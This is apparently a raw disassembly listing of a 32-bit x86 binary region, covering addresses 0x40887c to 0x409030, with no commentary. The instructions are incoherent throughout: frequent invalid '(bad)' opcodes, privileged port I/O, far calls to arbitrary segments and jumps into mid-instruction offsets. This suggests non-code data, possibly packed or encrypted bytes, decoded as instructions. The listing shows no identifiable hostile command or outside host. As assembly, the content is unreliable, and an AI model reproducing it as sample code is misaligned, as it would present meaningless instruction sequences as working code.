  40887c:	mov    ebp,0x2472a599
  408881:	mov    ah,0x6c
  408883:	das    
  408884:	in     al,dx
  408885:	sbb    al,0x89
  408887:	sbb    al,0xeb
  408889:	call   0xc703:0x78e3dc75
  408890:	out    dx,eax
  408891:	rol    BYTE PTR [ebx+0x43],0x35
  408895:	inc    ecx
  408896:	add    eax,0xbb75530d
  40889b:	xor    esp,DWORD PTR [esi]
  40889d:	es ret 0x8396
  4088a1:	pextrw esi,(bad),0xc5
  4088a3:	jbe    0x4088df
  4088a5:	xor    edx,DWORD PTR [esi+0x6f7536a3]
  4088ab:	push   edi
  4088ac:	xor    al,0xe4
  4088ae:	cmp    eax,0xef40c9bd
  4088b3:	scas   al,BYTE PTR es:[edi]
  4088b4:	pop    esi
  4088b5:	neg    BYTE PTR [eax]
  4088b7:	or     eax,0x547e3bde
  4088bc:	mov    ebp,0x5ef4ef00
  4088c1:	inc    edx
  4088c2:	mov    al,ds:0xb5322808
  4088c7:	ins    DWORD PTR es:[edi],dx
  4088c8:	jmp    0xfb7d:0xb5c8a9af
  4088cf:	cmp    ebx,edx
  4088d1:	cld    
  4088d2:	fwait
  4088d3:	lahf   
  4088d4:	imul   eax,ecx,0xffffffbc
  4088d7:	test   BYTE PTR [eax+0x57],ah
  4088da:	(bad)  
  4088db:	das    
  4088dc:	stos   DWORD PTR es:[edi],eax
  4088dd:	(bad)  
  4088de:	xchg   edx,eax
  4088df:	push   edx
  4088e0:	cmp    ecx,DWORD PTR [ebx+0x74]
  4088e3:	ins    BYTE PTR es:[edi],dx
  4088e4:	and    al,0xe
  4088e6:	rol    al,0xdf
  4088e9:	leave  
  4088ea:	ins    BYTE PTR es:[edi],dx
  4088eb:	test   esi,0xbfeccfeb
  4088f1:	jmp    0x69ddf571
  4088f6:	cmp    ecx,DWORD PTR [esp+ecx*2+0x50ba9041]
  4088fd:	push   es
  4088fe:	popf   
  4088ff:	repz sub DWORD PTR ds:0x6b9296ea,edi
  408906:	es xor al,0x6d
  408909:	out    dx,al
  40890a:	push   eax
  40890b:	push   ds
  40890c:	aam    0x8a
  40890e:	outs   dx,DWORD PTR ds:[esi]
  40890f:	ja     0x4088f1
  408911:	cs (bad) 
  408913:	sub    BYTE PTR [ecx],cl
  408915:	pop    ss
  408916:	mov    ch,0x8a
  408918:	stos   DWORD PTR es:[edi],eax
  408919:	sbb    eax,0x12e7dfff
  40891e:	jg     0x408974
  408920:	add    ebp,DWORD PTR [eax-0x1f]
  408923:	adc    edi,DWORD PTR [ebp+0x5cf16822]
  408929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40892a:	inc    esp
  40892b:	and    BYTE PTR [ebx-0x4c],0xdf
  40892f:	(bad)  
  408930:	repz jbe 0x4088c8
  408933:	shr    BYTE PTR [ebp+0x33],cl
  408936:	call   0x3edd:0xd526c11b
  40893d:	call   0xcd5379f6
  408942:	or     esi,DWORD PTR [ebp-0x22]
  408945:	push   ecx
  408946:	sub    eax,0x4c04070b
  40894b:	call   0x4753:0xc6e261cd
  408952:	mov    ds:0x29d97481,al
  408957:	sbb    BYTE PTR [eax],ch
  408959:	inc    esp
  40895a:	mov    esp,0x7ed1251b
  40895f:	jb     0x408942
  408961:	mov    ds:0x18b8448c,al
  408966:	fidiv  DWORD PTR ds:0x134d5fae
  40896c:	fnstenv ds:0xdd18126b
  408972:	loopne 0x408936
  408974:	or     eax,0x54279a92
  408979:	(bad)  
  40897a:	(bad)  
  40897b:	in     eax,0xfd
  40897d:	stos   DWORD PTR es:[edi],eax
  40897e:	push   ebp
  40897f:	sbb    ah,BYTE PTR [eax+ecx*2]
  408982:	sar    BYTE PTR [esi+eax*4+0x59],0xb9
  408987:	and    BYTE PTR [edi],ah
  408989:	in     al,dx
  40898a:	cwde   
  40898b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40898c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40898d:	int    0xc6
  40898f:	push   esp
  408990:	addr16 pop edx
  408992:	or     esp,DWORD PTR [edx-0x681a18fe]
  408998:	pop    ebp
  408999:	sub    DWORD PTR [ecx-0x2835513f],esp
  40899f:	ror    eax,cl
  4089a1:	fnsave [ebp-0x75]
  4089a4:	cmp    al,0x83
  4089a6:	sub    al,0xa4
  4089a8:	sub    BYTE PTR [edx],bh
  4089aa:	jle    0x4089d4
  4089ac:	in     al,dx
  4089ad:	mov    ch,0xee
  4089af:	mov    al,ds:0x81cf236d
  4089b4:	sub    eax,0x89e54a79
  4089b9:	iret   
  4089ba:	test   al,0xb4
  4089bc:	sbb    DWORD PTR [eax+0x578b7f74],edi
  4089c2:	imul   esi,DWORD PTR [edi],0xbf868e4f
  4089c8:	push   esi
  4089c9:	adc    eax,0x50454533
  4089ce:	sbb    BYTE PTR [edi],0x52
  4089d1:	shr    DWORD PTR [edx-0x1f027cb5],1
  4089d7:	mov    ?,esp
  4089d9:	dec    esi
  4089da:	and    eax,DWORD PTR [ecx]
  4089dc:	dec    edx
  4089dd:	in     eax,0x1a
  4089df:	inc    esi
  4089e0:	mov    ecx,DWORD PTR [esi-0x5e]
  4089e3:	aaa    
  4089e4:	push   ss
  4089e5:	dec    ebp
  4089e6:	mov    al,ds:0x36898e84
  4089eb:	xchg   esp,eax
  4089ec:	mov    ds:0xc4adda87,al
  4089f1:	cdq    
  4089f2:	in     eax,dx
  4089f3:	adc    ah,bl
  4089f5:	clc    
  4089f6:	enter  0x43f6,0x13
  4089fa:	shl    DWORD PTR [ecx+0x6a],1
  4089fd:	mov    ds:0xe81fe51c,eax
  408a02:	(bad)  [edi-0x6214eafb]
  408a08:	jae    0x408a26
  408a0a:	xor    edx,edi
  408a0c:	xor    BYTE PTR [ebx],0x73
  408a0f:	add    esp,DWORD PTR cs:[esi]
  408a12:	cld    
  408a13:	iret   
  408a14:	popa   
  408a15:	sbb    eax,0x187d345e
  408a1a:	imul   ecx,DWORD PTR [edx-0x76],0x883aa40e
  408a21:	adc    al,0x16
  408a23:	jne    0x408a2e
  408a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a26:	add    dl,BYTE PTR [edi]
  408a28:	out    dx,eax
  408a29:	sbb    DWORD PTR [eax+0x3668da9d],0xfffffff1
  408a30:	hlt    
  408a31:	ror    edi,cl
  408a33:	push   esp
  408a34:	aaa    
  408a35:	test   eax,0xb2447c6f
  408a3a:	mov    ah,0x40
  408a3c:	int3   
  408a3d:	sbb    BYTE PTR [edx+0x2],bl
  408a40:	and    eax,0x980e672f
  408a45:	xchg   ebp,eax
  408a46:	rcl    DWORD PTR [ebx+0x77],1
  408a49:	test   al,0x47
  408a4b:	xor    al,0xe4
  408a4d:	pop    edx
  408a4e:	lods   eax,DWORD PTR ds:[esi]
  408a4f:	dec    eax
  408a50:	push   ss
  408a51:	fs into 
  408a53:	shl    DWORD PTR [ebp+esi*4-0x726f688f],1
  408a5a:	xchg   ecx,eax
  408a5b:	or     ebx,DWORD PTR [edx-0xb3f97e4]
  408a61:	loope  0x408a9f
  408a63:	push   ebx
  408a64:	adc    DWORD PTR [ebp+0x78],edx
  408a67:	cld    
  408a68:	xbegin 0x3712dac6
  408a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a6f:	mov    eax,DWORD PTR [edi+0x5c1c06e0]
  408a75:	loopne 0x408a43
  408a77:	xchg   ebp,eax
  408a78:	push   ds
  408a79:	sbb    DWORD PTR [edx+0x4e],esi
  408a7c:	nop
  408a7d:	fwait
  408a7e:	push   ds
  408a7f:	mov    BYTE PTR [esi+0x253dad2d],bl
  408a85:	data16 pop cx
  408a88:	fnstcw WORD PTR [ecx+0x619e5bc7]
  408a8e:	xor    DWORD PTR [eax-0x33],esp
  408a91:	mov    ecx,0x77c951ee
  408a96:	push   esi
  408a97:	scas   al,BYTE PTR es:[edi]
  408a98:	lahf   
  408a99:	(bad)  
  408a9a:	std    
  408a9b:	sub    bh,al
  408a9d:	fdivr  st(0),st
  408a9f:	xor    eax,DWORD PTR [edi-0x6d]
  408aa2:	jl     0x408a5e
  408aa4:	adc    dl,0xca
  408aa7:	repnz lods al,BYTE PTR ds:[esi]
  408aa9:	fidivr DWORD PTR [eax+0x18]
  408aac:	lods   al,BYTE PTR ds:[esi]
  408aad:	inc    edx
  408aae:	sub    BYTE PTR [eax-0x33f8fb26],bl
  408ab4:	jecxz  0x408a65
  408ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab7:	add    ebp,DWORD PTR [ebx]
  408ab9:	and    al,0xd0
  408abb:	clc    
  408abc:	or     ah,BYTE PTR [ebp+esi*2+0x666d34ae]
  408ac3:	sub    eax,0x5bdf0b69
  408ac8:	mov    esi,0x3debc51b
  408acd:	push   edx
  408ace:	arpl   WORD PTR [esi-0x7dae5916],sp
  408ad4:	dec    edi
  408ad5:	pop    esi
  408ad6:	aad    0xd2
  408ad8:	lods   eax,DWORD PTR ds:[esi]
  408ad9:	jbe    0x408a7a
  408adb:	push   es
  408adc:	sahf   
  408add:	push   ebp
  408ade:	aam    0x7d
  408ae0:	lods   al,BYTE PTR ds:[esi]
  408ae1:	xlat   BYTE PTR ds:[ebx]
  408ae2:	dec    eax
  408ae3:	loopne 0x408ad1
  408ae5:	sub    dh,BYTE PTR [ebx]
  408ae7:	and    DWORD PTR [edx-0x781b2f8a],edi
  408aed:	inc    ebx
  408aee:	push   ss
  408aef:	inc    edx
  408af0:	mov    WORD PTR [edx+esi*4],gs
  408af3:	cmp    BYTE PTR ds:0xef7f013f,al
  408af9:	xor    BYTE PTR [esi-0x10],ch
  408afc:	mov    ds:0xe46b2023,al
  408b01:	or     edi,DWORD PTR [edx+esi*2+0x143e09c7]
  408b08:	fstp   QWORD PTR [edx]
  408b0a:	hlt    
  408b0b:	mov    esi,0xbb8d8c3c
  408b10:	(bad)  
  408b11:	into   
  408b12:	fwait
  408b13:	mov    ebx,0x93cc561b
  408b18:	out    0x85,al
  408b1a:	es and al,0x2c
  408b1d:	add    eax,0xbaeaeee9
  408b22:	xchg   ebx,ecx
  408b24:	aad    0x6b
  408b26:	nop
  408b27:	inc    ecx
  408b28:	loope  0x408b91
  408b2a:	iret   
  408b2b:	imul   edx,esi,0xfffffffe
  408b2e:	and    al,0x54
  408b30:	mov    dl,BYTE PTR [edi]
  408b32:	or     BYTE PTR [ecx],dh
  408b34:	xor    eax,0xe6737bb7
  408b39:	cmc    
  408b3a:	jo     0x408b07
  408b3c:	pop    esi
  408b3d:	xor    DWORD PTR [ebx-0x55812a88],0x1b2b314e
  408b47:	jg     0x408b72
  408b49:	test   DWORD PTR [edi+ebx*4-0x68],0x91e7fd3f
  408b51:	iret   
  408b52:	and    DWORD PTR [ecx-0x67],0xffffffe5
  408b56:	cld    
  408b57:	dec    edi
  408b58:	cs enter 0xb1b6,0xf
  408b5d:	mov    dh,0xf2
  408b5f:	das    
  408b60:	or     DWORD PTR [edx],0x6f
  408b63:	push   edx
  408b64:	adc    ah,BYTE PTR [edx-0x7c]
  408b67:	inc    eax
  408b68:	cmp    eax,0xd5b56882
  408b6d:	mov    ebx,0x3009011f
  408b72:	mov    dl,0x97
  408b74:	icebp  
  408b75:	mov    BYTE PTR [eax+ebx*1],0x29
  408b79:	enter  0x29ac,0xf
  408b7d:	into   
  408b7e:	leave  
  408b7f:	jmp    0x15aa:0x9e08ec39
  408b86:	call   0xb7ef8d54
  408b8b:	sub    al,0x42
  408b8d:	js     0x408b6d
  408b8f:	gs out 0xa1,eax
  408b92:	cmp    edx,ebp
  408b94:	mov    ebx,0xe4f89b7c
  408b99:	hlt    
  408b9a:	or     bh,bh
  408b9c:	loopne 0x408b7e
  408b9e:	inc    ebp
  408b9f:	xor    cl,BYTE PTR [ebp+0x52]
  408ba2:	stc    
  408ba3:	adc    al,0x3d
  408ba5:	in     eax,dx
  408ba6:	or     DWORD PTR [esi],ebx
  408ba8:	jl     0x408ba1
  408baa:	and    BYTE PTR [ecx],bl
  408bac:	ret    0xf26a
  408baf:	aas    
  408bb0:	into   
  408bb1:	jp     0x408b53
  408bb3:	pop    edx
  408bb4:	sbb    al,0x4b
  408bb6:	cmp    eax,0xb32df6e2
  408bbb:	sbb    BYTE PTR [esp+eax*2+0x1475ccad],bh
  408bc2:	mov    eax,0xa6a8cfd1
  408bc7:	cdq    
  408bc8:	adc    esi,DWORD PTR [eax+0x34c2c6b2]
  408bce:	inc    esi
  408bcf:	pop    esp
  408bd0:	and    ecx,DWORD PTR [eax+0x1c]
  408bd3:	repnz push edi
  408bd5:	adc    al,0x9e
  408bd7:	pop    ecx
  408bd8:	mov    BYTE PTR [edi+0x24885c11],bl
  408bde:	repnz xchg esi,eax
  408be0:	push   ds
  408be1:	xor    eax,0xb716f535
  408be6:	iret   
  408be7:	(bad)  
  408be9:	daa    
  408bea:	push   ebp
  408beb:	sbb    eax,0xe3c45387
  408bf0:	aam    0x3a
  408bf2:	or     DWORD PTR [esi-0x72],0x7bb4e045
  408bf9:	popf   
  408bfa:	leave  
  408bfb:	dec    ecx
  408bfc:	cld    
  408bfd:	sti    
  408bfe:	jmp    0x408c56
  408c00:	lock adc BYTE PTR [ebx+0x49],dl
  408c04:	sbb    dl,bl
  408c06:	fldenv [ecx-0x62959038]
  408c0c:	cwde   
  408c0d:	jne    0x408c15
  408c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c10:	lods   al,BYTE PTR ds:[esi]
  408c11:	pop    esp
  408c12:	inc    esi
  408c13:	imul   esi,DWORD PTR [ecx],0xd80638fa
  408c19:	dec    edi
  408c1a:	rol    ebx,0x85
  408c1d:	add    esp,DWORD PTR [ebp-0xc938a42]
  408c23:	xlat   BYTE PTR ds:[ebx]
  408c24:	in     eax,dx
  408c25:	(bad)
  408c28:	and    al,BYTE PTR ds:0x85f48142
  408c2e:	lods   eax,DWORD PTR ds:[esi]
  408c2f:	xor    dl,dh
  408c31:	mov    DWORD PTR [ebp+0x12de371f],esp
  408c37:	icebp  
  408c38:	and    eax,0x3d74e94b
  408c3d:	ret    0x25a0
  408c40:	inc    edx
  408c41:	in     al,0xcb
  408c43:	scas   eax,DWORD PTR es:[edi]
  408c44:	add    edx,DWORD PTR ds:0xa2af4139
  408c4a:	mov    ebp,DWORD PTR [ebp+edi*1+0x4396023c]
  408c51:	fst    DWORD PTR [ecx+0x36b4ec8]
  408c57:	clc    
  408c58:	sbb    edx,esi
  408c5a:	fild   WORD PTR [ecx-0x11eabb22]
  408c60:	(bad)  
  408c61:	push   0x586c193c
  408c66:	sbb    eax,0xcb4899bf
  408c6b:	and    edx,DWORD PTR [esi+esi*4]
  408c6e:	in     eax,0x97
  408c70:	push   ebx
  408c71:	(bad)  
  408c72:	ins    DWORD PTR es:[edi],dx
  408c73:	fbstp  TBYTE PTR [edi+eiz*2-0x2558ffa3]
  408c7a:	repnz aam 0xaa
  408c7d:	cmp    cl,BYTE PTR [eax]
  408c7f:	xor    eax,edx
  408c81:	xor    bl,cl
  408c83:	xchg   ecx,eax
  408c84:	dec    edx
  408c85:	add    DWORD PTR [ecx-0x48],edx
  408c88:	enter  0x1a4b,0xdc
  408c8c:	and    bh,BYTE PTR [edi+0x66]
  408c8f:	mov    dl,0xb2
  408c91:	call   0xfce5a5cd
  408c96:	int    0xcc
  408c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c99:	nop
  408c9a:	add    al,0x14
  408c9c:	mov    ds,ecx
  408c9e:	outs   dx,DWORD PTR ds:[esi]
  408c9f:	fs iret 
  408ca1:	fisubr WORD PTR [esi]
  408ca3:	jbe    0x408c76
  408ca5:	icebp  
  408ca6:	scas   al,BYTE PTR es:[edi]
  408ca7:	sub    BYTE PTR [ebx+0xf1e2f10],0x4e
  408cae:	add    BYTE PTR [edx+0x79],dl
  408cb1:	or     DWORD PTR [eax+0x31],esi
  408cb4:	pop    ebx
  408cb5:	loop   0x408cb9
  408cb7:	sbb    BYTE PTR [eax+0xd],bl
  408cba:	add    dl,ah
  408cbc:	inc    eax
  408cbd:	das    
  408cbe:	adc    DWORD PTR [si-0x70],esi
  408cc2:	sbb    cl,ch
  408cc4:	repz loop 0x408cd2
  408cc7:	xor    DWORD PTR [edi],ecx
  408cc9:	scas   eax,DWORD PTR es:[edi]
  408cca:	mov    DWORD PTR [ecx],ebx
  408ccc:	loop   0x408c98
  408cce:	sbb    BYTE PTR [edi+0x19],ah
  408cd1:	mov    al,ds:0x2d781328
  408cd6:	adc    al,0x3d
  408cd8:	jg     0x408d23
  408cda:	in     eax,dx
  408cdb:	stos   BYTE PTR es:[edi],al
  408cdc:	ss mov esi,0xddb4d2f8
  408ce2:	fnclex 
  408ce4:	dec    ebx
  408ce5:	fmul   DWORD PTR [esi-0x3d]
  408ce8:	jp     0x408c7c
  408cea:	fistp  DWORD PTR [ebp+0x31]
  408ced:	push   bp
  408cef:	adc    DWORD PTR [edx+0x56431d4],0xf9f91971
  408cf9:	in     eax,0x5d
  408cfb:	in     eax,dx
  408cfc:	das    
  408cfd:	mov    ebx,0x875e8e46
  408d02:	int3   
  408d03:	ss mov eax,0xea358541
  408d09:	cmp    BYTE PTR [esi-0x6c],dl
  408d0c:	push   esi
  408d0d:	xor    bl,0xcb
  408d10:	jnp    0x408cbc
  408d12:	cmp    esp,ecx
  408d14:	ins    BYTE PTR es:[edi],dx
  408d15:	lea    esi,ds:0x875e0b01
  408d1b:	aam    0x79
  408d1d:	pop    edi
  408d1e:	or     bh,BYTE PTR [ebx+0x56bef3d6]
  408d24:	in     eax,0x41
  408d26:	cmp    ah,BYTE PTR [esi-0x42]
  408d29:	ret    
  408d2a:	sbb    dl,BYTE PTR [ecx]
  408d2c:	xchg   esp,eax
  408d2d:	sub    eax,0x8fd1440
  408d32:	(bad)  
  408d33:	sbb    bl,BYTE PTR [edi+0x4d]
  408d36:	dec    eax
  408d37:	std    
  408d38:	das    
  408d39:	jno    0x408dad
  408d3b:	mov    esp,0x7b303cba
  408d40:	pop    ebp
  408d41:	sbb    DWORD PTR [ebp-0x532a42c1],eax
  408d47:	daa    
  408d48:	and    al,0xc5
  408d4a:	nop
  408d4b:	fld    QWORD PTR [eax+esi*2+0x1d04e14f]
  408d52:	pop    edx
  408d53:	inc    edx
  408d54:	sub    ch,BYTE PTR [eax+0x15c6c86c]
  408d5a:	xchg   BYTE PTR [esi],dh
  408d5c:	clc    
  408d5d:	jne    0x408d7e
  408d5f:	cs into 
  408d61:	ja     0x408d00
  408d63:	pop    esp
  408d64:	add    al,0xaa
  408d66:	into   
  408d67:	(bad)  
  408d68:	popf   
  408d69:	sbb    DWORD PTR [ecx-0x575dda82],ebp
  408d6f:	cdq    
  408d70:	or     ah,dh
  408d72:	push   ecx
  408d73:	icebp  
  408d74:	in     eax,dx
  408d75:	sbb    al,BYTE PTR [edi+0x21]
  408d78:	xor    dl,al
  408d7a:	cs out dx,al
  408d7c:	rcl    DWORD PTR [ebx+ebp*2],1
  408d7f:	xor    eax,0x335bf97d
  408d84:	or     eax,DWORD PTR [edx-0x64]
  408d87:	or     al,0xaf
  408d89:	sub    ecx,DWORD PTR [esi+0x3]
  408d8c:	sbb    DWORD PTR ds:0x6dbee12,ecx
  408d92:	push   ss
  408d93:	jns    0x408dff
  408d95:	sahf   
  408d96:	enter  0x4206,0x38
  408d9a:	daa    
  408d9b:	aas    
  408d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d9d:	push   ebx
  408d9e:	sti    
  408d9f:	icebp  
  408da0:	push   esi
  408da1:	jbe    0x408d8b
  408da3:	jne    0x408df6
  408da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408da6:	sbb    esp,DWORD PTR ds:0x7eebe3a7
  408dac:	out    dx,eax
  408dad:	cmp    bh,bh
  408daf:	(bad)  
  408db0:	lods   al,BYTE PTR ds:[esi]
  408db1:	xchg   ebp,eax
  408db2:	sahf   
  408db3:	mov    BYTE PTR [edx],cl
  408db5:	push   esi
  408db6:	adc    BYTE PTR [edi+ecx*8-0x2f],0xfe
  408dbb:	jmp    0xbdd3fb9b
  408dc0:	dec    esp
  408dc1:	cmp    al,0x84
  408dc3:	push   0xe
  408dc5:	shr    DWORD PTR [eax],1
  408dc7:	mov    ds:0x34cbb0d8,eax
  408dcc:	(bad)  
  408dcd:	pop    ebx
  408dce:	sub    ah,BYTE PTR [edi]
  408dd0:	ret    0x9d65
  408dd3:	add    eax,0xfe2d224b
  408dd8:	push   ebx
  408dd9:	stos   BYTE PTR es:[edi],al
  408dda:	clc    
  408ddb:	shl    ebp,cl
  408ddd:	xor    eax,0x9972f692
  408de2:	jge    0x408e37
  408de4:	mov    edi,0xe88dda10
  408de9:	mov    eax,ds:0xc824fcb3
  408dee:	or     BYTE PTR [ecx+esi*4+0x28],dh
  408df2:	mov    edx,DWORD PTR [ecx]
  408df4:	inc    eax
  408df5:	push   ecx
  408df6:	mov    edi,0xabb9b9e1
  408dfb:	(bad)  
  408dfc:	jns    0x408dfc
  408dfe:	jne    0x408e2d
  408e00:	test   BYTE PTR [esi],0x9b
  408e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e04:	sub    esi,esp
  408e06:	and    DWORD PTR ds:0xbf58c801,0x63
  408e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e0e:	addr16 cmp eax,0x43dca35a
  408e14:	mov    ecx,0xe8343689
  408e19:	push   0x6d
  408e1b:	or     esp,edi
  408e1d:	xchg   edx,eax
  408e1e:	push   ss
  408e1f:	jbe    0x408e75
  408e21:	dec    al
  408e23:	aas    
  408e24:	ja     0x408e7f
  408e26:	jbe    0x408dab
  408e28:	cmp    al,0xa6
  408e2a:	dec    ebx
  408e2b:	aam    0x99
  408e2d:	add    BYTE PTR [esi],al
  408e2f:	fs into 
  408e31:	inc    ebp
  408e32:	mov    esi,0x20342b9b
  408e37:	imul   edx,DWORD PTR [eax-0x4d4e545],0x3833c2d1
  408e41:	jne    0x408e80
  408e43:	dec    edi
  408e44:	nop
  408e45:	fdiv   st(1),st
  408e47:	test   al,0xd
  408e49:	cld    
  408e4a:	loop   0x408df3
  408e4c:	and    cl,BYTE PTR [edi+0x72]
  408e4f:	mov    WORD PTR [esi-0x21],gs
  408e52:	stos   BYTE PTR es:[edi],al
  408e53:	cmc    
  408e54:	cmp    BYTE PTR [edx-0x3b391f21],bh
  408e5a:	lea    ebp,[edi+eiz*2+0x50]
  408e5e:	push   esi
  408e5f:	sti    
  408e60:	loope  0x408ee0
  408e62:	xor    esp,DWORD PTR [eax-0x24]
  408e65:	in     al,dx
  408e66:	adc    eax,0x94abccd5
  408e6b:	dec    bp
  408e6d:	mov    eax,0x993c045d
  408e72:	lods   al,BYTE PTR ds:[esi]
  408e73:	lds    esp,FWORD PTR [edx-0x12]
  408e76:	xchg   edi,eax
  408e77:	fdiv   st(5),st
  408e79:	xchg   esp,eax
  408e7a:	clc    
  408e7b:	loope  0x408e69
  408e7d:	enter  0x553d,0xed
  408e81:	and    al,0xf2
  408e83:	lahf   
  408e84:	sub    dl,BYTE PTR [edi-0x15d5ddc0]
  408e8a:	es jle 0x408eb4
  408e8d:	pop    ecx
  408e8e:	inc    ebx
  408e8f:	repnz mov ecx,DWORD PTR [eax+0x79]
  408e93:	push   ebx
  408e94:	pop    ds
  408e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e96:	push   ss
  408e97:	push   ecx
  408e98:	sub    ebx,ecx
  408e9a:	mov    esp,0xef781f54
  408e9f:	popf   
  408ea0:	or     bh,BYTE PTR [esi+0x10]
  408ea3:	dec    edi
  408ea4:	xor    eax,0xdcf855bd
  408ea9:	in     al,dx
  408eaa:	push   esp
  408eab:	pusha  
  408eac:	lods   al,BYTE PTR ds:[esi]
  408ead:	gs sbb eax,0x5439e9ba
  408eb3:	pop    es
  408eb4:	mov    ds:0xa862fe61,eax
  408eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eba:	dec    esp
  408ebb:	sbb    BYTE PTR [ebp+ebp*4-0x7704b648],al
  408ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ec3:	dec    edx
  408ec4:	push   es
  408ec5:	(bad)  
  408ec6:	xchg   esp,eax
  408ec7:	lds    ebp,FWORD PTR [edx+0x38]
  408eca:	adc    DWORD PTR [eax-0x20],edx
  408ecd:	(bad)  
  408ece:	push   ss
  408ecf:	scas   al,BYTE PTR es:[edi]
  408ed0:	nop
  408ed1:	mov    eax,0x15e75ce2
  408ed6:	adc    DWORD PTR [esi-0x2a],eax
  408ed9:	(bad)  
  408eda:	shl    BYTE PTR [eax+eax*8],0xb
  408ede:	ja     0x408ef4
  408ee0:	out    0xaa,al
  408ee2:	xlat   BYTE PTR ds:[ebx]
  408ee3:	je     0x408f04
  408ee5:	inc    esp
  408ee6:	fadd   st,st(5)
  408ee8:	test   eax,0xd8b0a851
  408eed:	jle    0x408ead
  408eef:	popf   
  408ef0:	jno    0x408f6d
  408ef2:	xchg   ebp,eax
  408ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef4:	aas    
  408ef5:	aam    0x75
  408ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef8:	fwait
  408ef9:	inc    ecx
  408efa:	clc    
  408efb:	mov    al,ds:0x41bf9e48
  408f00:	jp     0x408f42
  408f02:	or     bh,BYTE PTR [ebx]
  408f04:	sbb    eax,0x8035ab3d
  408f09:	ja     0x408f5e
  408f0b:	xor    ecx,DWORD PTR [edx+0x26533913]
  408f11:	cdq    
  408f12:	lods   eax,DWORD PTR ds:[esi]
  408f13:	pop    ebp
  408f14:	mov    esp,0x694ca7b2
  408f19:	xchg   DWORD PTR [edx+0x2d21f127],edx
  408f1f:	(bad)  
  408f20:	push   ds
  408f21:	outs   dx,DWORD PTR ds:[esi]
  408f22:	sub    al,0x4c
  408f24:	rol    dh,1
  408f26:	arpl   WORD PTR [esi+0xf34db01],di
  408f2c:	pushf  
  408f2d:	adc    DWORD PTR [esi-0x4ca959f8],edx
  408f33:	jle    0x408f56
  408f35:	adc    eax,0xb89c4dd4
  408f3a:	pop    edi
  408f3b:	xchg   esp,eax
  408f3c:	jle    0x408efd
  408f3e:	daa    
  408f3f:	test   DWORD PTR [eax],0xa3dcf5b0
  408f45:	add    ch,cl
  408f47:	outs   dx,DWORD PTR ds:[esi]
  408f48:	add    eax,0xe2e56da1
  408f4d:	sbb    DWORD PTR [ebp+0x64],eax
  408f50:	ror    BYTE PTR [esi-0x74799460],0x7a
  408f57:	xor    al,0x7b
  408f59:	bound  edi,QWORD PTR [ebx+ebp*1-0x1f]
  408f5d:	imul   eax,DWORD PTR [ecx],0xffffff97
  408f60:	xor    edi,DWORD PTR [edx]
  408f62:	and    dl,BYTE PTR [edx*1-0x6b0b9c7c]
  408f69:	sbb    al,0xc8
  408f6b:	ja     0x408f61
  408f6d:	and    ch,0x70
  408f70:	fldenv [ebp-0x75]
  408f73:	xchg   DWORD PTR [edi+0x2dc3bb7],esi
  408f79:	xchg   edx,eax
  408f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f7b:	cdq    
  408f7c:	xor    al,0xb2
  408f7e:	lea    esi,[edi-0x47]
  408f81:	or     ebp,DWORD PTR ds:0xb42c3b35
  408f87:	cmp    DWORD PTR [edi+0x43],ebp
  408f8a:	mov    ah,0x97
  408f8c:	mov    dh,0x48
  408f8e:	popf   
  408f8f:	stos   DWORD PTR es:[edi],eax
  408f90:	push   ds
  408f91:	dec    ebx
  408f92:	jmp    0x408f5d
  408f94:	mov    ebx,0x7936a4d3
  408f99:	sub    eax,0x811fb5b8
  408f9e:	ret    0x5acc
  408fa1:	std    
  408fa2:	fwait
  408fa3:	in     al,0xb3
  408fa5:	in     eax,dx
  408fa6:	lahf   
  408fa7:	enter  0x8f61,0xa1
  408fab:	jbe    0x408fc6
  408fad:	mov    eax,fs:0x4a7251c
  408fb3:	add    eax,0x55d1d63d
  408fb8:	outs   dx,BYTE PTR ds:[esi]
  408fb9:	fiadd  DWORD PTR [ebx+0x4]
  408fbc:	sub    DWORD PTR [edi-0xed440b5],esp
  408fc2:	add    eax,0x721b4971
  408fc7:	sbb    bl,cl
  408fc9:	sbb    eax,0x4016e9ce
  408fce:	mov    bl,0xb2
  408fd0:	call   0xaf7f9a23
  408fd5:	jl     0x408fde
  408fd7:	mov    ds:0x8f3e6d91,al
  408fdc:	sub    al,0x8d
  408fde:	adc    DWORD PTR [ebx+ebx*2-0x15],0xffffffca
  408fe3:	pop    ebx
  408fe4:	add    DWORD PTR [ecx-0x754ffb62],0x66
  408feb:	lock jmp 0xb8af131a
  408ff1:	cli    
  408ff2:	imul   edi,DWORD PTR [eax+0x25],0x12
  408ff6:	xchg   esi,eax
  408ff7:	push   esi
  408ff8:	fwait
  408ff9:	xchg   DWORD PTR [edi+ebp*4-0x36],edi
  408ffd:	push   esi
  408ffe:	ret    
  408fff:	push   edi
  409000:	lods   eax,DWORD PTR ds:[esi]
  409001:	fs inc esp
  409003:	mov    ebx,0xb4dbbaa
  409008:	push   edi
  409009:	je     0x409089
  40900b:	adc    al,0x83
  40900d:	pop    ds
  40900e:	jmp    0x9d7d:0xc2afad18
  409015:	cmp    al,0x8d
  409017:	fnop   
  409019:	popf   
  40901a:	mov    ebp,0xc3ac87b3
  40901f:	xor    BYTE PTR [edx+edi*2-0x21],dh
  409023:	xchg   ebp,eax
  409024:	adc    ebx,DWORD PTR [eax-0x2f9a74de]
  40902a:	arpl   WORD PTR [esi],cx
  40902c:	push   es
  40902d:	into   
  40902e:	jns    0x40904e
  409030:	or     edi,0x30663278
